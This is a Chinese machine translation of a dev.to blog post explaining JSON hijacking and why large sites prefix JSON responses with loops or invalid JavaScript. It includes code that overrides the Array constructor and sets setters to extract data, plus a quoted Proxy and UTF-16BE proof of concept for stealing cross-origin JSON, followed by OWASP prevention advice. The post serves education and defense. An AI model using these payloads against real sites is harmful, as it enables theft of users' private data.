# 为什么脸书的 api 以 for 循环开始

> 原文：<https://dev.to/antogarand/why-facebooks-api-starts-with-a-for-loop-1eob>

如果您曾经在浏览器中检查过对大公司 API 的请求，您可能会注意到在 JSON 本身之前有一些奇怪的 javascript:

> 脸书 [![Facebook](img/3364083e01ace6a0640dcb4ce9183f00.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--kc1Sjl6H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/0ilzmxjo89zo3xcchd09.png)
> 
> Gmail[T2![Facebook](img/1f6076d594738412fa15ab1394dd926a.png)](https://res.cloudinary.com/practicaldev/image/fetch/s--l1L9q7ME--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://thepracticaldev.s3.amazonaws.com/i/x0kj3nle3typ7ctp4hdv.png)

为什么他们要浪费几个字节来使这个 JSON 无效呢？

# 保护您的数据

如果没有这些重要的字节，任何网站都有可能访问这些数据。

这个漏洞被称为 [JSON 劫持](https://duckduckgo.com/?q=json+hijacking)，允许网站从这些 API 中提取 JSON 数据。

## 起源

在 JavaScript 1.5 和更早的版本中，可以覆盖原语对象的构造函数，并在使用括号符号时调用这个被覆盖的版本。

这意味着你可以做:

```
function Array(){
    alert('You created an array!');
}
var x = [1,2,3]; 
```

Enter fullscreen mode Exit fullscreen mode

警报就会弹出！

用下面的脚本替换`var x`，攻击者就可以阅读你的邮件了！

这是通过在加载外部脚本之前覆盖`Array`构造函数来实现的。

```
<script src="https://gmail.com/messages"></script> 
```

Enter fullscreen mode Exit fullscreen mode

## 数据提取

即使您覆盖了构造函数，数组仍然被构造，您仍然可以通过`this`访问它。

这里有一个代码片段，它将警告所有的数组数据:

```
function Array() {
  var that = this;
  var index = 0;
  // Populating the array with setters, which dump the value when called
  var valueExtractor = function(value) {
    // Alert the value
    alert(value);
    // Set the next index to use this method as well
    that.__defineSetter__(index.toString(),valueExtractor );
    index++;
  };
  // Set the setter for item 0
  that.__defineSetter__(index.toString(),valueExtractor );
  index++;
} 
```

Enter fullscreen mode Exit fullscreen mode

在创建数组时，它们的值将被警告！

这个问题在 *ECMAScript 4* 提案中得到解决，因为我们现在不能再覆盖大多数原语的原型，比如`Object`和`Array`。

尽管 ES4 从未发布，但主要浏览器在发现该漏洞后很快就修复了该漏洞。

* * *

在今天的 javascript 中仍然可以有类似的行为，但是它仅限于您创建的变量，或者不使用括号符号的项创建。

这将是先前有效载荷的改编版本:

```
// Making an array
const x = [];

// Making the overwritten methods
x.copy = [];
const extractor = (v) => {
    // Keeping the value in a different array
    x.copy.push(v);
    // Setting the extractor for the next value
    const currentIndex = x.copy.length;
    x.__defineSetter__(currentIndex, extractor);
    x.__defineGetter__(currentIndex, ()=>x.copy[currentIndex]);
    // Logging the value
    console.log('Extracted value', v);
};

// Assigning the setter on index 0 
x.__defineSetter__(0, extractor);
x.__defineGetter__(0, ()=>x.copy[0]);

// Using the array as usual

x[0] = 'zero';
x[1] = 'one';

console.log(x[0]);
console.log(x[1]); 
```

Enter fullscreen mode Exit fullscreen mode

这将是一个使用`Array`关键字创建数组的版本:

```
function Array(){
    console.log(arguments);
}

Array("secret","values"); 
```

Enter fullscreen mode Exit fullscreen mode

如您所见，添加到阵列的数据被记录，而功能保持不变！

* * *

修复本身并不是阻止`function Array`的创建，而是强制项目创建的括号符号使用本机实现，而不是您的自定义函数。

这意味着我们仍然可以创建一个`Array`函数，但是不会用方括号数组创建(`[1,2,3]`)来调用它。

虽然我们使用`x = new Array(1,2,3)`或者`x = Array(1,2,3)`的符号，它还是会被调用，但是这并不影响 JSON 劫持。

# 现代变奏

好的，我们知道旧版本的浏览器很容易受到攻击。这对今天的我们意味着什么？

随着 EcmaScript 6 最近的发布，新的有趣的特性被添加进来，比如代理！

来自 Portswigger [的 Gareth Heyes](https://portswigger.net/blog/json-hijacking-for-the-modern-web) 在博客中指出这种攻击的现代变种，它仍然允许我们从 JSON 端点窃取数据！

使用代理代替访问器可以让我们窃取任何创建的变量，不管它的名字是什么。除了对任何被访问或被写入的属性，它可以表现得像一个访问器。

利用这个和另一个怪癖，有可能再次窃取数据！

> UTF-16BE 是一个多字节字符集，因此两个字节实际上将构成一个字符。例如，如果您的脚本以["开头，这将被视为字符 0x5b22，而不是 0x5b 0x22。0x5b22 恰好是有效的 JavaScript 变量=)。你能看出这是怎么回事吗？

使用这样的脚本:

```
<script charset="UTF-16BE" src="external-script-with-array-literal"></script> 
```

Enter fullscreen mode Exit fullscreen mode

有了这个脚本中的一些受控数据，以及实用的移位脚本来使这些数据变得清晰，我们就可以再次泄漏数据了！

这是他最后的 edge POC，摘自他的博客文章:

```
<!doctype HTML>
<script>
Object.setPrototypeOf(__proto__,new Proxy(__proto__,{
    has:function(target,name){
        alert(name.replace(/./g,function(c){ c=c.charCodeAt(0);return String.fromCharCode(c>>8,c&0xff); }));
    }
}));
</script> <script charset="UTF-16BE" src="external-script-with-array-literal"></script> <!-- script contains the following response: ["supersecret","<?php echo chr(0)?>aa"] --> 
```

Enter fullscreen mode Exit fullscreen mode

由于我不会深入解释他的方法，我强烈建议你阅读[他的帖子](https://portswigger.net/blog/json-hijacking-for-the-modern-web)了解更多信息。

# 预防

以下是 OWASP 的官方建议，摘自他们的 AJAX 安全备忘单

*   使用 CSRF 保护
    这通过在安全报头或 csrf 令牌丢失时不返回数据来防止利用。

*   总是返回外部有对象的 JSON

最后一个解决方案很有趣。

在 Firefox 和 IE 中，这是有效的:

```
x = [{"key":"value"}]
x = {"key":"value"}
[{"key":"value"}]
{key: "value"} 
```

Enter fullscreen mode Exit fullscreen mode

但这不是:

```
{"key":"value"} 
```

Enter fullscreen mode Exit fullscreen mode

无效的原因是浏览器认为括号是块语句的开始，而不是对象创建。
不带引号的符号`{key: "value"}`被认为是一个标签，值是一个语句。

Chrome 和其他的不一样，它认为这些情况是一个对象创建，因此它创建了一个新的对象。

感谢 [Matt (r0x33d)](https://twitter.com/r0x33d) 帮忙解开这个谜团！

> ![Matt profile image](img/c67e788ba8f689c02c3ffc9beacfa177.png)马特@ r0x 33d![twitter logo](img/4c8a2313941dda016bf4d78d103264aa.png)[@ Jon _ bottarini](https://twitter.com/jon_bottarini)[@ AntoGarand](https://twitter.com/AntoGarand)[@ marcs 0h](https://twitter.com/MarcS0h)至于{key:'value'} -这是作为带标签的块语句处理的。您可以通过将{key:'value '，keytwo:'value2'}写入控制台来确认，这将不起作用。2018 年 11 月 13 日上午 06:15[![Twitter reply action](img/44d8b042100e231770330321e5b63d65.png)](https://twitter.com/intent/tweet?in_reply_to=1062227343350083584)[![Twitter retweet action](img/93d9c70ccc54851d2e8e881b53c21dae.png)](https://twitter.com/intent/retweet?tweet_id=1062227343350083584)[![Twitter like action](img/2e93f7775eadefab8bcd34a4542cc5a7.png)](https://twitter.com/intent/like?tweet_id=1062227343350083584)

更新:[V8 车队的 Mathias Bynens](https://twitter.com/mathias/) 指出了这一点:

> 但是 DevTools 隐式地包装了您的输入代码来实现这一点。

> ![Mathias Bynens profile image](img/dedf260f16ec3783dd7e70f43cf5ca29.png)马蒂亚斯·拜恩斯[@马蒂亚斯](https://dev.to/mathias)![twitter logo](img/4c8a2313941dda016bf4d78d103264aa.png)[@安托加兰](https://twitter.com/AntoGarand) [@v8js](https://twitter.com/v8js) 你大概是直接把
> 
> { " key ":" value " }
> 
> 粘贴到 DevTools 控制台后得出的结论。但是 DevTools 隐式地包装了您的输入代码来实现这一点。2018 年 11 月 15 日上午 07:22[![Twitter reply action](img/44d8b042100e231770330321e5b63d65.png)](https://twitter.com/intent/tweet?in_reply_to=1062969191106412544)[![Twitter retweet action](img/93d9c70ccc54851d2e8e881b53c21dae.png)](https://twitter.com/intent/retweet?tweet_id=1062969191106412544)[![Twitter like action](img/2e93f7775eadefab8bcd34a4542cc5a7.png)](https://twitter.com/intent/like?tweet_id=1062969191106412544)

这可以通过`eval`评估代码来测试，而不是简单地运行它:

```
eval('{"x":"y"}'); 
```

Enter fullscreen mode Exit fullscreen mode

这在所有浏览器上都引发了相同的错误。

因此，Chrome 在原始脚本标签中可以正确处理这个输入，即使开发工具控制台可能没有相同的行为。

# 结论

虽然这些载体今天可能不起作用，但我们永远不知道明天会带来什么新的 bug，因此我们仍然应该尽最大努力防止 API 被利用。如果我们认为[这个 StackOverflow 答案](https://stackoverflow.com/questions/16289894/is-json-hijacking-still-an-issue-in-modern-browsers)的答案是理所当然的，我们将很容易受到现代变种的攻击，因此仍然有可能被黑客攻击。

谷歌和脸书的答案是在他们的 JSON 数据前添加无效的 javascript 或无限循环，但 OWASP 列出的其他替代方法很少。

# 参考文献:

[Haacked.com-JSON 劫机](https://haacked.com/archive/2009/06/25/json-hijacking.aspx/)

[stack overflow——为什么谷歌要在他们的 JSON 响应前加上【一个循环】](https://stackoverflow.com/questions/2669690/why-does-google-prepend-while1-to-their-json-responses)

[Portswigger - JSON 劫持现代网络](https://portswigger.net/blog/json-hijacking-for-the-modern-web)
[和加雷思·海耶斯的幻灯片](https://www.owasp.oimg/6/6a/OWASPLondon20161124_JSON_Hijacking_Gareth_Heyes.pdf)